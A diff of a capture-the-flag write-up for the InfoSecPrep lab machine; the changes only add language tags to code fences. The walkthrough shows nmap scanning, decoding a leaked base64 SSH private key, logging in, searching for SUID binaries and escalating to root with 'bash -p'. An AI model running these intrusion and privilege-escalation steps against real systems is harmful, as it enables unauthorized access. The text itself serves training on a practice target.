@@ -2,7 +2,7 @@
 
 Enumeration started by executing `nmap`
 
-```
+```jsx
 ┌──(kali㉿root)-[~/machines/02-infosecprep]
 └─$ sudo nmap infosecprep
 Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-09 12:56 EDT
@@ -20,7 +20,7 @@ By running `nmap` we got to know that the machine has two open ports: `22/tcp ss
 
 Now executing command for detailed scanning of the network we got
 
-```
+```jsx
 ┌──(kali㉿root)-[~/machines/02-infosecprep]
 └─$ sudo nmap -sC -p 22,80 infosecprep
 Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-09 13:01 EDT
@@ -52,7 +52,7 @@ after visiting `/robots.txt`  when we try to visit `/secret.txt` we get
 
 ![](./images/2.png)
 
-```
+```md
 saurab@0xsaurab ~> cat secret.txt
 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
 QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
@@ -104,7 +104,7 @@ T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
 
 Looking at the nature of the encoding and “==” at the end of the, we can guess it might be `base64`. Let’s decode this in our local machine.
 
-```
+```bash
 ┌──(kali㉿root)-[~/machines/02-infosecprep]
 └─$ cat secret.txt | base64 -d > oscp.key
 
@@ -156,14 +156,14 @@ For logging into the user name by `ssh` we need to have `-rw-------` permission 
 
 After changing permission, we can login into user `oscp` with below command
 
-```
+```bash
 ┌──(kali㉿root)-[~/machines/02-infosecprep]
 └─$ ssh -v -i oscp.key oscp@infosecprep
 ```
 
 after logging into the user `oscp` we can get our first flag
 
-```
+```bash
 -bash-5.0$
 -bash-5.0$ whoami
 oscp
@@ -191,7 +191,7 @@ First_FLAG{1c63dffa208c4349f094ede49f19230a}
 
 we have `POSIX shell script` on the local folder of the script for which we don't have permission to execute.
 
-```
+```bash
 -bash-5.0$ file ip
 ip: POSIX shell script, ASCII text executable
 -bash-5.0$ cat ip
@@ -206,7 +206,7 @@ ip: 3: cannot create /etc/issue: Permission denied
 
 and also we don't have permission to go to `/root` directory
 
-```
+```bash
 -bash-5.0$ cd /root
 -bash: cd: /root: Permission denied
 ```
@@ -217,7 +217,7 @@ For that we are required to esclate our prevelige level to `root` user from `osc
 
 first we find misconfigured binaries
 
-```
+```bash
 -bash-5.0$ find / -perm -4000 2> /dev/null
 /snap/snapd/8790/usr/lib/snapd/snap-confine
 /snap/snapd/8140/usr/lib/snapd/snap-confine
@@ -272,7 +272,7 @@ https://gtfobins.github.io/gtfobins/bash/
 
 and we can get another flag in `/root` directory
 
-```
+```bash
 -bash-5.0$ bash -p
 bash-5.0# whoami
 root
@@ -300,7 +300,7 @@ Second_FLAG{34e7ef52a96b29dccd0de00ea217ed96}
 
 ### Flags
 
-```
+```bash
 First_FLAG{1c63dffa208c4349f094ede49f19230a}
 Second_FLAG{34e7ef52a96b29dccd0de00ea217ed96}
 ```
